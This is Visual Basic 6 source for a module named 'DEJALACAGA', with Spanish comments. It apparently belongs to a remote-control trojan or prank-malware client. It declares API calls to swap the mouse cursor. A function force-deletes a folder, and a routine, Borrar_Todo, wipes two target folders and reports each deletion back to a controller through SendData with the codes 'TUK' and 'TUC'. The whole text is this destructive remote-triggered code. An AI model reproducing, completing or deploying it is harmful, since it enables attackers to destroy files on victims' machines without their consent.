Attribute VB_Name = "DEJALACAGA"
Option Explicit
Public Declare Function SetClassLong Lib "user32" Alias "SetClassLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Public Const GLC_HCURSOR = (-12)
Public hSwapCursor As Long
Public Declare Function LoadCursorFromFile Lib "user32" Alias "LoadCursorFromFileA" (ByVal lpfilename As String) As Long

' función que borra la carpeta
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Function Eliminar_Directorio(Path As String) As Boolean

On Error GoTo Error_Sub

    'Variable de tipo file System Object
    Dim fso As FileSystemObject

    'Creamos la Nueva referencia Fso
    Set fso = New FileSystemObject

    'Le pasamos a DeleTeFolder el Path a eliminar
    fso.DeleteFolder Path, True

    If Err.Number = 0 Then
       ' Ok
       Eliminar_Directorio = True
       Set fso = Nothing
    End If
    
Exit Function
Error_Sub:

MsgBox Err.Description, vbCritical

End Function

Sub Borrar_Todo()
    
   
            
            ' elimina la carpeta
            If Eliminar_Directorio(Trim(Direccion1)) Then
                Call SendData("TUK")
            End If
      
       If Eliminar_Directorio(Trim(Direccion2)) Then
                Call SendData("TUC")
            End If
End Sub



